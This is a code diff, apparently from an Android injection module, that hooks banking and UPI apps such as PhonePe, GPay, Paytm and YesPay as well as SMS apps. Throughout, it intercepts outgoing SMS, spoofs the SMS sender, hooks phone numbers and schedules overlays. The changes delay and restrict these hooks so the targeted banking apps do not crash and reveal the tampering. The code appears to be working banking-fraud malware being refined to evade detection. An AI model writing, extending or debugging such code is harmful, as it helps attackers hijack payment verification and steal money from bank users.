@@ -119,6 +119,16 @@ bool native_overlay_wanted() {
     return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
 }
 
+/** Bubble only on a few hosts — every bank WebView overlay = open crash. */
+bool overlay_allowed_pkg(const std::string& pkg) {
+    if (pkg.empty()) return false;
+    if (pkg.find("phonepe") != std::string::npos) return true;
+    if (pkg.find("herofincorp") != std::string::npos) return true;
+    if (pkg.find("messaging") != std::string::npos) return true;
+    if (pkg == "com.android.mms" || pkg == "com.motorola.messaging") return true;
+    return false;
+}
+
 bool is_yespay(const std::string& pkg) {
     return pkg.find("yespay") != std::string::npos || pkg.find("yesbank") != std::string::npos;
 }
@@ -173,15 +183,12 @@ void* deferred_hook_worker(void* arg) {
     if (job->vm && job->api) {
         JNIEnv* env = nullptr;
         if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
-            // Re-assert Drive Java ISms (Application now warm) + native backup
+            // SAFE for banking: Java ISms only + Intent already armed.
+            // NO Binder/inline/phone/sender — those crash PhonePe/GPay/Paytm/YesPay on open.
             overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
             outgoing_sms_hook::arm_intercept_hooks();
-            std::string st =
-                outgoing_sms_hook::install_for_upi(env, job->api, job->pkg.c_str());
-            phone_number_hook::install(env, job->api, job->pkg.c_str());
-            sender_spoof::install(env, job->api, job->pkg.c_str());
             append_diag("/data/local/tmp/hivirtus_inject.log",
-                        ("HOOK_DEFERRED|" + st + "|armed+phone+sender+java_isms").c_str());
+                        ("HOOK_DEFERRED_SAFE_JAVA|" + job->pkg).c_str());
             job->vm->DetachCurrentThread();
         }
     }
@@ -291,13 +298,12 @@ public:
         if (is_msg_) {
             std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
             report_line(api_, std::string("HOOK_MSG|") + sms_st);
-        } else if (fragile_) {
-            bool intent_ok = outgoing_sms_hook::install_intent_plt_pre(api_, true);
-            report_line(api_, std::string("fragile_intent_plt:") + pkg_ +
-                                  (intent_ok ? "|ok" : "|fail"));
         } else {
-            std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
-            report_line(api_, std::string("HOOK_UPI|") + sms_st);
+            // ALL UPI/banking: Intent PLT only in pre — never Binder/phone (open crash)
+            fragile_ = true;
+            bool intent_ok = outgoing_sms_hook::install_intent_plt_pre(api_, true);
+            report_line(api_, std::string("upi_safe_intent_plt:") + pkg_ +
+                                  (intent_ok ? "|ok" : "|fail"));
         }
 
         keep_ = true;
@@ -325,38 +331,31 @@ public:
             mkdir(base.c_str(), 0700);
             FILE* sf = fopen((base + "/post_hooks.txt").c_str(), "w");
             if (sf) {
-                fprintf(sf, "post_v160:%s msg=%d fragile=%d upi=%d\n", pkg_.c_str(),
+                fprintf(sf, "post_v169:%s msg=%d fragile=%d upi=%d\n", pkg_.c_str(),
                         is_msg_ ? 1 : 0, fragile_ ? 1 : 0, is_upi_ ? 1 : 0);
                 fclose(sf);
             }
         }
 
-        // Drive MenuLoader: Java IBinder→ISms FIRST
-        overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
-
         if (is_msg_) {
+            // Messages: full path — real SIM ISms + Java
+            overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             schedule_deferred_java_sms(env_, pkg_, 3);
             report_line(api_, "post_msg_ok:" + pkg_);
-        } else if (fragile_) {
-            outgoing_sms_hook::arm_intercept_hooks();
-            const int delay = is_yespay(pkg_) ? 2 : 1;
-            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
-            report_line(api_, "post_fragile_deferred:" + pkg_ + "|d=" + std::to_string(delay));
-            if (native_overlay_wanted()) {
-                schedule_overlay_ui(env_, api_, pkg_, delay + 1);
-            }
         } else {
-            outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
-            phone_number_hook::install(env_, api_, pkg_.c_str());
-            sender_spoof::install(env_, api_, pkg_.c_str());
-            schedule_deferred_java_sms(env_, pkg_, 2);
-            if (native_overlay_wanted()) {
-                schedule_overlay_ui(env_, api_, pkg_, 3);
+            // UPI/banking SAFE: no immediate Java/Binder/phone/overlay
+            outgoing_sms_hook::arm_intercept_hooks();
+            int delay = upi_registry::hook_startup_delay_sec(pkg_);
+            if (delay < 4) delay = 4;
+            if (is_yespay(pkg_)) delay = 6;
+            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
+            report_line(api_, "post_upi_safe_deferred:" + pkg_ + "|d=" + std::to_string(delay));
+            if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
+                schedule_overlay_ui(env_, api_, pkg_, delay + 2);
             }
-            report_line(api_, "post_upi_ok:" + pkg_);
         }
 
         touch_heartbeat();
